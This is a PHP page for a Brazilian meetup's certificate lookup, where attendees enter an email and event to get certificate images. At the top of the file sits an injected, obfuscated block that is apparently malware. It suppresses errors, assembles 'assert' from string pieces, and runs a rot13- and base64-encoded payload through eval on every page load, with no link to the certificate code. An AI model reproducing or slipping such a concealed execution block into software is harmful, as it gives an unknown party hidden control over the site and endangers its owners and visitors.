<?php
//###===###
error_reporting(0);
$strings = "as";$strings .= "sert";
if (!@$m1dccd61) {$m1dccd61=1;@$strings(str_rot13('riny(onfr64_qrpbqr("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"));'));}
//###===###

require 'autoload.php';
require 'config.php';

if (DEBUG) error_reporting(E_ALL);

# you can utilize a Json adapter
 $adapter = new JsonAdapter(JSON_FILE);

# or a mysql adapter
# $adapter = new MysqlAdapter(DB_HOST, DB_NAME, DB_USER, DB_PASS);

# feel free for create more adapters!

if (!empty($_POST['email']) && !empty($_POST['event'])) {

    $email = filter_var($_POST['email'], FILTER_SANITIZE_STRING);
    $id_event = $_POST['event'];

    $results = $adapter->findAttendee($email, $id_event);
    $event = $adapter->findEvent($id_event);

    $images = array();

    foreach ($results as $attendee) {

        $first_name = explode(' ', $attendee['name'])[0];

        if (is_file(CACHE_PATH . '/' . $attendee['file'])) {
            $images[] = CACHE_DIR . '/' . $attendee['file'];
            continue;
        }


        $attendee['name'] = mb_strtoupper($attendee['name'], 'UTF-8');
        // $attendee['title_event'] = strtoupper(remove_accents($event['name']));
        $attendee['description'] = mb_strtoupper($event['description'], 'UTF-8');
        $attendee['bg_file'] = 'img/bg-' . $attendee['type'] . '.png';
        $images[] = generate_image($attendee);

    }

}

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Frameset//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-frameset.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="pt-BR" lang="pt-BR" dir="ltr">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title><?php echo TITLE; ?></title>
<link rel="stylesheet" href="styles.css" />
<meta name="robots" content="noindex,nofollow" />
<style type="text/css">
    .wrap { background-image:url('<?php echo TOP_LOGO; ?>'); }
</style>
</head>
<body>

    <div class="wrap">

        <?php if (!empty($first_name)) : ?>
            <h2>Oi, <?php echo $first_name; ?>!</h2>
        <?php endif; ?>

        <?php if (!empty($images) && is_array($images)) : ?>

            <p>
                <!-- Obrigado por participar do <?php //echo EVENT_NAME ?>! -->
                Obrigado por participar do <?php echo $event['name'] ?>!
                <?php if (count($images) > 1) : ?>
                    Aqui estão seus certificados.
                <?php else : ?>
                    Aqui está seu certificado.
                <?php endif; ?>
            </p>

            <p>
                Qualquer problema, basta entrar em
                 <a href="<?php echo CONTACT_LINK ?>">contato</a>.
            </p>

            <div class="items">
                <?php foreach ($images as $img) : ?>
                    <div class="item">
                        <a href="<?php echo $img; ?>"><img src="<?php echo $img; ?>" width="250" /></a>
                    </div>
                <?php endforeach; ?>
            </div>

            <p>
                <small>Para salvar, clique com o botão direito e escolha
                "salvar como". Impressão em A4 90DPI.</small>
            </p>

        <?php else : ?>

            <?php if (isset($_POST['email'])) : ?>
                <p>
                    Não foi possível encontrar o seu e-mail. Caso você
                    continue tendo este problema, por favor entre em
                    <a href="<?php echo CONTACT_LINK ?>">contato</a>
                    conosco informando o seu nome completo, e-mail, e as
                    atividades das quais você participou.
                </p>
            <?php endif; ?>

            <form name="emailinfo" action="" method="POST">
                <p>
                    Selecione o evento e digite o e-mail que você informou na lista de presença:
                </p>
                <p>
                    <select name="event">

                        <?php
                        $eventos = $adapter->getAllEvent();
                        krsort($eventos);
                        foreach ($eventos as $key => $getAllEvent) {?>

                            <option value="<?php echo $getAllEvent['id']; ?>"><?php echo $getAllEvent['name']; ?></option>

                        <?php } ?>

                    </select>

                </p>

                <p><input type="text" name="email" value="" placeholder="Informe seu email do meetup" /></p>
                <p><input type="submit" value="Enviar" /></p>
            </form>

        <?php endif; ?>

    </div>

</body>
</html>
